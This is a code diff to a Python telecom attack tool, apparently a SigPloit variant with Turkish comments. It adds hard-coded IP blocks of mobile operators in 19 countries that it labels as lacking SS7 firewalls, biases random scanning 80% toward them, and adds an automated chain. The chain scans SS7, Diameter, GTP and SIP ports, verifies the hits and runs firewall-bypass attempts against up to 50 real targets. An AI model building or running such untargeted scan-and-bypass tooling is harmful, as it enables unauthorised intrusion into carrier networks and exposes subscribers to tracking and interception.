@@ -17,8 +17,112 @@ from scapy.all import IP, TCP, UDP, SCTP, SCTPChunkInit, SCTPChunkInitAck, SCTPC
 
 conf.verb = 0
 
-RISK_PRIORITY_COUNTRIES = ["NG", "EG", "IN", "BR", "RU"]
+RISK_PRIORITY_COUNTRIES = ["NG", "EG", "IN", "BR", "RU", "PH", "VN", "BD", "PK", "KE", "GH", "TZ", "UG", "ZA", "CO", "MX", "UA", "KZ", "UZ"]
 PORT_TO_PROTO = {2904: "SS7", 2905: "SS7", 2906: "SS7", 2907: "SS7", 2908: "SS7", 3868: "DIAMETER", 3869: "DIAMETER", 2123: "GTP", 2152: "GTP", 5060: "SIP", 5061: "SIP"}
+
+# Zafiyetli ulkelerin telekom altyapi IP bloklari
+# SS7 firewall'i zayif veya olmayan operator'ler
+VULN_COUNTRY_SUBNETS = {
+    # AFRIKA (en yuksek risk - SS7 firewall'siz operatorler)
+    "NG": [  # Nijerya (MTN, Airtel, Glo, 9mobile)
+        "41.58.0.0/16", "41.73.0.0/16", "41.138.0.0/16", "41.190.0.0/16",
+        "41.203.0.0/16", "41.206.0.0/16", "41.211.0.0/16", "197.210.0.0/16",
+        "197.255.0.0/16", "154.113.0.0/16", "105.112.0.0/16", "105.113.0.0/16",
+    ],
+    "EG": [  # Misir (Vodafone, Orange, Etisalat)
+        "41.32.0.0/16", "41.33.0.0/16", "41.34.0.0/16", "41.35.0.0/16",
+        "41.36.0.0/16", "41.37.0.0/16", "41.38.0.0/16", "41.39.0.0/16",
+        "41.65.0.0/16", "41.128.0.0/16", "41.129.0.0/16", "41.130.0.0/16",
+        "41.176.0.0/16", "41.178.0.0/16", "41.179.0.0/16", "41.187.0.0/16",
+        "196.218.0.0/16", "197.32.0.0/16", "197.33.0.0/16", "197.34.0.0/16",
+    ],
+    "KE": [  # Kenya (Safaricom, Airtel)
+        "41.72.0.0/16", "41.89.0.0/16", "41.139.0.0/16", "41.215.0.0/16",
+        "105.48.0.0/16", "105.161.0.0/16", "196.201.0.0/16", "197.136.0.0/16",
+    ],
+    "GH": [  # Gana
+        "41.57.0.0/16", "41.74.0.0/16", "41.204.0.0/16", "41.210.0.0/16",
+        "154.160.0.0/16", "197.135.0.0/16",
+    ],
+    "TZ": [  # Tanzanya
+        "41.59.0.0/16", "41.73.128.0/17", "41.188.0.0/16", "41.222.0.0/16",
+        "196.192.0.0/16", "197.148.0.0/16",
+    ],
+    "ZA": [  # Guney Afrika (MTN, Vodacom, Cell C)
+        "41.0.0.0/16", "41.1.0.0/16", "41.2.0.0/16", "41.13.0.0/16",
+        "41.76.0.0/16", "41.78.0.0/16", "41.79.0.0/16", "41.112.0.0/16",
+        "105.0.0.0/16", "105.1.0.0/16", "105.2.0.0/16", "105.3.0.0/16",
+        "154.0.0.0/16", "196.2.0.0/16", "196.7.0.0/16", "196.11.0.0/16",
+    ],
+    # ASYA (orta-yuksek risk)
+    "IN": [  # Hindistan (BSNL, Airtel, Jio)
+        "49.32.0.0/16", "49.33.0.0/16", "49.34.0.0/16", "49.35.0.0/16",
+        "59.88.0.0/16", "59.89.0.0/16", "59.90.0.0/16", "59.91.0.0/16",
+        "117.192.0.0/16", "117.193.0.0/16", "117.194.0.0/16", "117.195.0.0/16",
+        "117.196.0.0/16", "117.197.0.0/16", "117.198.0.0/16", "117.199.0.0/16",
+        "122.160.0.0/16", "122.161.0.0/16", "122.162.0.0/16", "122.163.0.0/16",
+        "182.64.0.0/16", "182.65.0.0/16", "182.66.0.0/16", "182.67.0.0/16",
+    ],
+    "BD": [  # Banglades (Grameenphone, Robi, Banglalink)
+        "103.4.0.0/16", "103.5.0.0/16", "103.7.0.0/16", "103.9.0.0/16",
+        "103.48.0.0/16", "103.108.0.0/16", "114.130.0.0/16", "180.149.0.0/16",
+    ],
+    "PK": [  # Pakistan (Jazz, Telenor, Zong)
+        "39.32.0.0/16", "39.33.0.0/16", "39.34.0.0/16", "39.35.0.0/16",
+        "39.36.0.0/16", "39.37.0.0/16", "39.38.0.0/16", "39.39.0.0/16",
+        "39.40.0.0/16", "39.41.0.0/16", "39.42.0.0/16", "39.43.0.0/16",
+        "119.73.0.0/16", "119.160.0.0/16", "182.176.0.0/16", "182.177.0.0/16",
+    ],
+    "PH": [  # Filipinler (Globe, Smart)
+        "49.144.0.0/16", "49.145.0.0/16", "49.146.0.0/16", "49.147.0.0/16",
+        "112.198.0.0/16", "112.199.0.0/16", "112.200.0.0/16", "112.201.0.0/16",
+        "119.92.0.0/16", "119.93.0.0/16", "119.94.0.0/16", "119.95.0.0/16",
+    ],
+    "VN": [  # Vietnam (Viettel, VNPT, Mobifone)
+        "14.160.0.0/16", "14.161.0.0/16", "14.162.0.0/16", "14.163.0.0/16",
+        "14.164.0.0/16", "14.165.0.0/16", "14.166.0.0/16", "14.167.0.0/16",
+        "113.160.0.0/16", "113.161.0.0/16", "113.162.0.0/16", "113.163.0.0/16",
+    ],
+    # GUNEY AMERIKA (orta risk)
+    "BR": [  # Brezilya (Claro, Vivo, TIM, Oi)
+        "177.0.0.0/16", "177.1.0.0/16", "177.2.0.0/16", "177.3.0.0/16",
+        "179.104.0.0/16", "179.105.0.0/16", "179.106.0.0/16", "179.107.0.0/16",
+        "187.0.0.0/16", "187.1.0.0/16", "187.2.0.0/16", "187.3.0.0/16",
+        "189.0.0.0/16", "189.1.0.0/16", "189.2.0.0/16", "189.3.0.0/16",
+        "200.128.0.0/16", "200.129.0.0/16", "200.130.0.0/16", "200.131.0.0/16",
+    ],
+    "CO": [  # Kolombiya
+        "186.0.0.0/16", "186.1.0.0/16", "186.2.0.0/16", "186.3.0.0/16",
+        "181.128.0.0/16", "181.129.0.0/16", "181.130.0.0/16", "181.131.0.0/16",
+    ],
+    "MX": [  # Meksika (Telcel, AT&T)
+        "187.128.0.0/16", "187.129.0.0/16", "187.130.0.0/16", "187.131.0.0/16",
+        "189.128.0.0/16", "189.129.0.0/16", "189.130.0.0/16", "189.131.0.0/16",
+        "201.0.0.0/16", "201.1.0.0/16", "201.2.0.0/16", "201.3.0.0/16",
+    ],
+    # ESKI SOVYET (orta risk)
+    "RU": [  # Rusya (MTS, Beeline, Megafon, Tele2)
+        "5.128.0.0/16", "5.129.0.0/16", "5.130.0.0/16", "5.131.0.0/16",
+        "37.112.0.0/16", "37.113.0.0/16", "46.0.0.0/16", "46.1.0.0/16",
+        "77.34.0.0/16", "77.35.0.0/16", "77.36.0.0/16", "77.37.0.0/16",
+        "95.24.0.0/16", "95.25.0.0/16", "95.26.0.0/16", "95.27.0.0/16",
+        "176.59.0.0/16", "176.60.0.0/16", "176.61.0.0/16", "176.62.0.0/16",
+        "188.162.0.0/16", "188.163.0.0/16", "188.164.0.0/16", "188.165.0.0/16",
+    ],
+    "UA": [  # Ukrayna (Kyivstar, Vodafone, lifecell)
+        "46.33.0.0/16", "46.118.0.0/16", "46.119.0.0/16", "46.148.0.0/16",
+        "176.36.0.0/16", "176.37.0.0/16", "178.136.0.0/16", "178.137.0.0/16",
+        "193.138.0.0/16", "195.64.0.0/16",
+    ],
+    "KZ": [  # Kazakistan (Beeline, Kcell, Tele2)
+        "2.132.0.0/16", "2.133.0.0/16", "2.134.0.0/16", "2.135.0.0/16",
+        "37.150.0.0/16", "37.151.0.0/16", "46.34.0.0/16", "46.35.0.0/16",
+        "178.89.0.0/16", "178.90.0.0/16", "178.91.0.0/16",
+    ],
+    "UZ": [  # Ozbekistan
+        "31.40.0.0/16", "46.255.0.0/16", "80.80.0.0/16", "195.69.0.0/16",
+    ],
+}
 
 # ============================================
 # PROTOCOL VERIFICATION FUNCTIONS
@@ -336,6 +440,7 @@ def multi_scan_menu():
     print("6) Verify Existing Results (from leaks_*.txt)")
     print("7) Limited Scan (N subnet, controlled run)")
     print("8) Risk-Temelli Ulke Analizi (dosyadan)")
+    print("\033[33m9) Tam Otomatik Zincir (Zafiyet Onceli Ulkeler)\033[0m")
     print()
     print("or type back to return")
     print()
@@ -358,10 +463,12 @@ def multi_scan_menu():
         run_limited_scan_menu()
     elif choice == "8":
         run_risk_based_country_menu()
+    elif choice == "9":
+        run_auto_chain_global()
     elif choice == "back":
         return
     else:
-        print('\n\033[31m[-]Error:\033[0m Please Enter a Valid Choice (1-8)')
+        print('\n\033[31m[-]Error:\033[0m Please Enter a Valid Choice (1-9)')
         time.sleep(1.5)
         multi_scan_menu()
 
@@ -626,8 +733,15 @@ def run_risk_based_country_menu():
     print(f"[+] Rapor: {os.path.abspath(out_name)}")
     input("\nPress Enter to return...")
 
-def run_multi_scan(protocols, max_subnets=None):
-    """Run scanning with protocol-level verification."""
+def run_multi_scan(protocols, max_subnets=None, auto_chain=False):
+    """
+    Run scanning with protocol-level verification.
+    
+    Args:
+        protocols: List of protocols to scan ['SS7', 'DIAMETER', 'GTP', 'SIP']
+        max_subnets: Maximum number of subnets to scan (None = infinite)
+        auto_chain: If True, automatically run verification + vulnerability test after scan
+    """
     
     PROTOCOL_PORTS = {
         'SS7': [2904, 2905, 2906, 2907, 2908],
@@ -636,15 +750,19 @@ def run_multi_scan(protocols, max_subnets=None):
         'SIP': [5060, 5061],
     }
     
-    print("\n" + "=" * 60)
-    print(f" Scanning: {', '.join(protocols)}")
+    print("\n" + "=" * 70)
+    print(f" GLOBAL TELECOM SCANNER - ZAFIYET ONCELI")
+    print(f" Protocols: {', '.join(protocols)}")
     print(f" Mode: Port Scan + Protocol Verification")
-    print("=" * 60)
+    if auto_chain:
+        print(f" AUTO-CHAIN: Scan -> Verify -> Vuln Test -> Report")
+    print("=" * 70)
     print()
+    print("[!] Zafiyetli ulkeler oncelikli: NG, EG, IN, BR, RU, PH, VN, KE, GH, TZ, ZA, CO, MX, UA, KZ, UZ")
     print("[!] Output Files:")
     for proto in protocols:
         print(f"    - leaks_{proto.lower()}.txt (port scan hits)")
-    print(f"    - leaks_verified.txt (protocol-verified only)")
+        print(f"    - leaks_verified.txt (protocol-verified only)")
     print()
     if max_subnets is None:
         print("[+] Press Ctrl+C to stop.\n")
@@ -668,7 +786,7 @@ def run_multi_scan(protocols, max_subnets=None):
     
     try:
         while True:
-            subnet = generate_random_subnet()
+            subnet = generate_prioritized_subnet()
             network = ipaddress.ip_network(subnet, strict=False)
             target_ips = [str(ip) for ip in list(network.hosts())[:50]]
             
@@ -779,6 +897,18 @@ def run_multi_scan(protocols, max_subnets=None):
     input("\nPress Enter to return...")
 
 
+def generate_prioritized_subnet():
+    """
+    Zafiyetli ulkelerden %80, random global %20.
+    SS7 firewall'siz operator bloklarini onceliklendirir.
+    """
+    if random.random() < 0.80:  # %80 zafiyetli ulke
+        country = random.choice(list(VULN_COUNTRY_SUBNETS.keys()))
+        return random.choice(VULN_COUNTRY_SUBNETS[country])
+    else:
+        return generate_random_subnet()  # %20 global rastgele
+
+
 def generate_random_subnet():
     """Generate random public /24, excluding private/reserved."""
     while True:
@@ -859,6 +989,172 @@ def scan_udp_fast(target_ips, ports):
             responses.append(f"{recv[IP].src}:{sent[UDP].dport}")
     
     return responses
+
+
+def run_auto_chain_global():
+    """
+    Tam Otomatik Zincir: Zafiyet Onceli Global Tarama
+    Adim 1: Zafiyetli ulkelerden baslayarak tum protokolleri tara
+    Adim 2: Bulunan hedefleri dogrula (M3UA/CER/Echo/OPTIONS)
+    Adim 3: Dogrulanmis hedeflere firewall bypass + zafiyet testi
+    Adim 4: Ozet rapor olustur
+    """
+    os.system('cls' if os.name == 'nt' else 'clear')
+    
+    print("=" * 65)
+    print(" TAM OTOMATIK ZINCIR - ZAFIYET ONCELI GLOBAL TARAMA")
+    print(" Scan -> Verify -> Bypass -> Vuln Test -> Report")
+    print("=" * 65)
+    print()
+    print("\033[33m[!] Bu mod zafiyeti bilinen ulke subnetlerinden baslar\033[0m")
+    print(f"\033[36m[i] Oncelikli ulkeler: {len(VULN_COUNTRY_SUBNETS)} ulke (%80 oncelik)\033[0m")
+    print()
+    
+    max_subnets = _prompt_int("Maksimum subnet sayisi", 100, min_value=5, max_value=10000)
+    protocols = ['SS7', 'DIAMETER', 'GTP', 'SIP']
+    
+    print(f"\n\033[32m[ADIM 1/4] TARAMA BASLIYOR - {max_subnets} subnet\033[0m")
+    print(f"  Protokoller: {', '.join(protocols)}")
+    print(f"  Oncelik: Zafiyetli ulkeler (%80)")
+    print()
+    
+    # ADIM 1: Prioritized scan
+    run_multi_scan(protocols, max_subnets=max_subnets, auto_chain=True)
+    
+    # ADIM 2: Verify existing results
+    print(f"\n\033[32m[ADIM 2/4] DOGRULAMA BASLIYOR\033[0m")
+    print("  Bulunan tum hedefler protokol seviyesinde dogrulanacak...")
+    print()
+    time.sleep(1)
+    verify_existing_results()
+    
+    # ADIM 3: Firewall bypass on verified targets
+    print(f"\n\033[32m[ADIM 3/4] FIREWALL BYPASS BASLIYOR\033[0m")
+    print("  Dogrulanmis hedeflere bypass teknikleri uygulanacak...")
+    print()
+    time.sleep(1)
+    
+    verified_targets = []
+    verified_file = "leaks_verified.txt"
+    if os.path.exists(verified_file):
+        try:
+            with open(verified_file, 'r', encoding='utf-8', errors='replace') as f:
+                for line in f:
+                    line = line.strip()
+                    if not line or line.startswith('---') or line.startswith('Started'):
+                        continue
+                    # Extract IP:port from lines like "[SS7] 1.2.3.4:2905 | SCTP"
+                    import re
+                    m = re.search(r'(\d+\.\d+\.\d+\.\d+):(\d+)', line)
+                    if m:
+                        verified_targets.append((m.group(1), int(m.group(2))))
+        except Exception as e:
+            print(f"  \033[31m[-] Verified dosya okunamadi: {e}\033[0m")
+    
+    bypass_results = []
+    if verified_targets:
+        # Deduplicate
+        verified_targets = list(set(verified_targets))
+        print(f"  \033[36m[i] {len(verified_targets)} hedef icin bypass deneniyor...\033[0m\n")
+        
+        try:
+            from ss7.firewall_bypass import run_all_bypasses
+            for idx, (ip, port) in enumerate(verified_targets[:50], 1):  # Max 50
+                print(f"\n  [{idx}/{min(len(verified_targets), 50)}] {ip}:{port}")
+                try:
+                    result = run_all_bypasses(ip, port, timeout=5, verbose=False)
+                    if result:
+                        bypass_results.append({'ip': ip, 'port': port, 'result': result})
+                        success_count = sum(1 for r in result if r.get('success'))
+                        if success_count > 0:
+                            print(f"    \033[32m[+] {success_count} bypass basarili!\033[0m")
+                        else:
+                            print(f"    \033[31m[-] Bypass basarisiz\033[0m")
+                except Exception as e:
+                    print(f"    \033[31m[-] Hata: {e}\033[0m")
+        except ImportError:
+            print("  \033[31m[-] firewall_bypass modulu yuklenemedi\033[0m")
+    else:
+        print("  \033[33m[!] Dogrulanmis hedef bulunamadi, bypass atlaniyor.\033[0m")
+    
+    # ADIM 4: Generate report
+    print(f"\n\033[32m[ADIM 4/4] RAPOR OLUSTURULUYOR\033[0m")
+    time.sleep(0.5)
+    
+    report_file = f"global_auto_chain_report_{time.strftime('%Y%m%d_%H%M%S')}.txt"
+    try:
+        with open(report_file, 'w', encoding='utf-8') as f:
+            f.write("=" * 65 + "\n")
+            f.write(" SIGPLOIT - TAM OTOMATIK ZINCIR RAPORU\n")
+            f.write(f" Tarih: {time.ctime()}\n")
+            f.write("=" * 65 + "\n\n")
+            
+            # Scan results summary
+            f.write("[1] TARAMA SONUCLARI\n")
+            f.write("-" * 40 + "\n")
+            for proto in protocols:
+                fname = f"leaks_{proto.lower()}.txt"
+                count = 0
+                if os.path.exists(fname):
+                    with open(fname, 'r', encoding='utf-8', errors='replace') as pf:
+                        count = sum(1 for line in pf if line.strip())
+                f.write(f"  {proto}: {count} hedef bulundu\n")
+            
+            # Verified targets
+            f.write(f"\n[2] DOGRULANMIS HEDEFLER\n")
+            f.write("-" * 40 + "\n")
+            f.write(f"  Toplam: {len(verified_targets)} hedef\n")
+            for ip, port in verified_targets[:20]:
+                f.write(f"  - {ip}:{port}\n")
+            if len(verified_targets) > 20:
+                f.write(f"  ... ve {len(verified_targets) - 20} daha\n")
+            
+            # Bypass results
+            f.write(f"\n[3] FIREWALL BYPASS SONUCLARI\n")
+            f.write("-" * 40 + "\n")
+            total_bypassed = 0
+            for br in bypass_results:
+                success_count = sum(1 for r in br['result'] if r.get('success'))
+                if success_count > 0:
+                    total_bypassed += 1
+                    f.write(f"  [BYPASS OK] {br['ip']}:{br['port']} - {success_count} teknik basarili\n")
+                    for r in br['result']:
+                        if r.get('success'):
+                            f.write(f"    + {r.get('technique', 'unknown')}: {r.get('details', '')}\n")
+            f.write(f"\n  Toplam bypass edilen: {total_bypassed}/{len(bypass_results)}\n")
+            
+            # Vulnerability summary
+            f.write(f"\n[4] ZAFIYET OZETI\n")
+            f.write("-" * 40 + "\n")
+            vuln_count = 0
+            for vuln_file in ['vuln_results.txt', 'leaks_verified.txt']:
+                if os.path.exists(vuln_file):
+                    with open(vuln_file, 'r', encoding='utf-8', errors='replace') as vf_r:
+                        for line in vf_r:
+                            if 'VULN' in line.upper() or 'BYPASS' in line.upper() or 'VERIFIED' in line.upper():
+                                vuln_count += 1
+                                f.write(f"  {line.strip()}\n")
+            if vuln_count == 0:
+                f.write("  Kritik zafiyet bulunamadi.\n")
+            
+            f.write(f"\n{'=' * 65}\n")
+            f.write(f" Rapor sonu - {time.ctime()}\n")
+            f.write(f"{'=' * 65}\n")
+        
+        print(f"\n  \033[32m[+] Rapor olusturuldu: {report_file}\033[0m")
+    except Exception as e:
+        print(f"\n  \033[31m[-] Rapor olusturulamadi: {e}\033[0m")
+    
+    # Final summary
+    print(f"\n{'=' * 65}")
+    print(f" OTOMATIK ZINCIR TAMAMLANDI")
+    print(f" Taranan subnet: {max_subnets}")
+    print(f" Dogrulanmis hedef: {len(verified_targets)}")
+    print(f" Bypass basarili: {sum(1 for br in bypass_results if any(r.get('success') for r in br['result']))}")
+    print(f" Rapor: {report_file}")
+    print(f"{'=' * 65}")
+    
+    input("\nPress Enter to return...")
 
 
 if __name__ == "__main__":
